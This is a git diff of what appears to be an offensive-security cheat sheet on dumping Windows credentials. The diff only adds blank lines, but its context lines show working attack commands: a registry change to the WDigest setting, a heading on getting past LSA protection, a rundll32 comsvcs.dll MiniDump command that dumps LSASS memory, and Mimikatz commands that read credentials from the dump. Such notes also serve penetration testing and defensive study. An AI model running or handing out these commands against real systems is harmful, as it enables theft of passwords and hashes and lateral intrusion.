@@ -64,6 +64,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   * Adding requires lock
   * Removing requires reboot
 
+
 ## LSA Protection Workaround
 
 - LSA as a Protected Process (RunAsPPL)
@@ -134,6 +135,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.
 
 
 Use the minidump:
+
 * Mimikatz: `.\mimikatz.exe "sekurlsa::minidump lsass.dmp"`
   ```powershell
   mimikatz # sekurlsa::minidump lsass.dmp
